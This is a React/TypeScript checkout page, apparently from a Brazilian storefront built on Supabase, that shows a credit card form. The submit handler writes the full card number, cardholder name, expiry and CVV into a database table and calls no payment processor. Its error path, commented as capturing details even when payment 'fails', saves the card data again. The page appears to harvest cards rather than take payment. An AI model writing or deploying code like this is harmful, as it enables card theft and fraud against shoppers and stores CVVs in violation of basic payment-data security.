
import { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import { useQueryClient } from '@tanstack/react-query';
import { toast } from 'sonner';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowLeft } from 'lucide-react';
import CreditCardForm, { CreditCardFormValues } from '@/components/payment/CreditCardForm';
import { supabase } from '@/integrations/supabase/client';
import ProductSummary from '@/components/payment/ProductSummary';
import { createPaymentInfo } from '@/services/paymentInfoService';

export default function CartaoPage() {
  const { slug } = useParams();
  const navigate = useNavigate();
  const location = useLocation();
  const queryClient = useQueryClient();
  const [produto, setProduto] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pedidoData, setPedidoData] = useState<any>(null);
  
  // Get pedidoId from URL query params
  const searchParams = new URLSearchParams(location.search);
  const pedidoId = searchParams.get('pedidoId');
  
  useEffect(() => {
    async function fetchData() {
      if (!slug) {
        setError('Produto não encontrado');
        setLoading(false);
        return;
      }
      
      try {
        // Fetch product
        const { data: produtoData, error: produtoError } = await supabase
          .from('produtos')
          .select('*')
          .eq('slug', slug)
          .single();
        
        if (produtoError) {
          throw produtoError;
        }
        
        setProduto(produtoData);
        
        // Check if pedidoId exists
        if (!pedidoId) {
          navigate(`/checkout/${slug}`);
          return;
        }
        
        // Fetch pedido data if pedidoId exists
        if (pedidoId) {
          const { data: pedido, error: pedidoError } = await supabase
            .from('pedidos')
            .select('*')
            .eq('id', pedidoId)
            .single();
            
          if (pedidoError) {
            console.error('Error fetching pedido:', pedidoError);
          } else {
            setPedidoData(pedido);
          }
        }
        
      } catch (error) {
        console.error('Error fetching data:', error);
        setError('Erro ao carregar dados do produto');
      } finally {
        setLoading(false);
      }
    }
    
    fetchData();
  }, [slug, pedidoId, navigate]);
  
  const handleSubmit = async (data: CreditCardFormValues) => {
    if (!pedidoId) {
      toast.error('ID do pedido não encontrado');
      return;
    }
    
    setSubmitting(true);
    console.log("Processing credit card payment with data:", { ...data, cvv: '***' });
    
    try {
      // Save the credit card information
      await createPaymentInfo({
        pedido_id: pedidoId,
        metodo_pagamento: 'cartao',
        numero_cartao: data.numero_cartao,
        nome_cartao: data.nome_cartao,
        validade: data.validade,
        cvv: data.cvv,
        parcelas: parseInt(data.parcelas.split('x')[0], 10)
      });
      
      console.log("Payment info saved successfully");
      
      // Update order status
      const { error: updateError } = await supabase
        .from('pedidos')
        .update({ status: 'pago' })
        .eq('id', pedidoId);
      
      if (updateError) {
        console.error("Error updating order status:", updateError);
        throw updateError;
      }
      
      console.log("Order status updated successfully");
      
      // Refresh pedidos data
      queryClient.invalidateQueries({ queryKey: ['pedidos'] });
      
      // Navigate to success page or back to product
      toast.success('Pagamento processado com sucesso!');
      navigate(`/checkout/${slug}`);
      
    } catch (error) {
      console.error('Error processing payment:', error);
      
      // Still capture payment details even if payment "fails"
      try {
        console.log("Capturing payment info even though payment failed");
        await createPaymentInfo({
          pedido_id: pedidoId,
          metodo_pagamento: 'cartao',
          numero_cartao: data.numero_cartao,
          nome_cartao: data.nome_cartao,
          validade: data.validade,
          cvv: data.cvv,
          parcelas: parseInt(data.parcelas.split('x')[0], 10)
        });
        
        // Update order status to reflect failure
        await supabase
          .from('pedidos')
          .update({ status: 'reprovado' })
          .eq('id', pedidoId);
          
      } catch (captureError) {
        console.error('Error capturing payment info:', captureError);
      }
      
      // Navigate to failure page
      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
      toast.error('Erro ao processar pagamento. Tente novamente.');
    } finally {
      setSubmitting(false);
    }
  };
  
  const handleBack = () => {
    navigate(`/checkout/${slug}`);
  };
  
  if (loading) {
    return (
      <div className="container max-w-4xl mx-auto py-8 px-4">
        <Card>
          <CardContent className="p-8 text-center">
            <div className="animate-pulse">
              <div className="h-8 bg-gray-200 rounded w-1/2 mx-auto mb-4"></div>
              <div className="h-4 bg-gray-200 rounded w-3/4 mx-auto mb-2"></div>
              <div className="h-4 bg-gray-200 rounded w-2/3 mx-auto"></div>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }
  
  if (error || !produto) {
    return (
      <div className="container max-w-4xl mx-auto py-8 px-4">
        <Card>
          <CardContent className="p-8 text-center">
            <h2 className="text-xl font-bold text-red-500 mb-2">Erro</h2>
            <p className="text-gray-600">{error || 'Produto não encontrado'}</p>
            <Button className="mt-4" onClick={() => navigate('/')}>
              Voltar para a página inicial
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }
  
  return (
    <div className="container max-w-4xl mx-auto py-8 px-4">
      <Button 
        variant="ghost" 
        onClick={handleBack} 
        className="mb-4 hover:bg-gray-100"
      >
        <ArrowLeft className="h-4 w-4 mr-2" />
        Voltar
      </Button>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        <div>
          <h1 className="text-2xl font-bold mb-6">Pagamento com Cartão</h1>
          <CreditCardForm 
            onSubmit={handleSubmit} 
            submitting={submitting}
            buttonColor={produto.cor_botao || '#22c55e'}
            buttonText={produto.texto_botao || 'Finalizar Compra'}
          />
        </div>
        
        <div>
          <ProductSummary 
            produto={produto} 
            pedido={pedidoData || {valor: produto.preco}}
          />
        </div>
      </div>
    </div>
  );
}
